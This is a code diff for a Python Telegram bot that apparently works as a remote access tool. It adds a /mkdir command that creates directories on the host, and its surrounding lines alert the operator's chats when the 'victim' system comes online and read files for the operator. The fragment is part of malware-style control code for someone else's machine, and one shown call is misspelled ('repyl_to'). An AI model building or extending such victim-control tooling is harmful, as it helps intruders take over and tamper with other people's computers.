@@ -182,6 +182,17 @@ File content:
 {content}''')
     except:
         bot.repyl_to(message,"file is inaccessible.")
+
+@bot.message_handler(commands=['mkdir'])
+def makedir(message):
+    bot.reply_to(message,f"Enter the directory name you want to creat in {os.getcwd()}")
+    bot.register_next_step_handler(message,mkdir)
+def mkdir(message):
+    try:
+        os.mkdir(f"{os.getcwd()}/{message.text}")
+        bot.send_message(message.chat.id,f"Directory {os.getcwd()}/{message.text} is created successfully")
+    except:
+        bot.reply_to(message,"Directory couldn't be created......")
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
     bot.send_message(j,"Target system is on......")
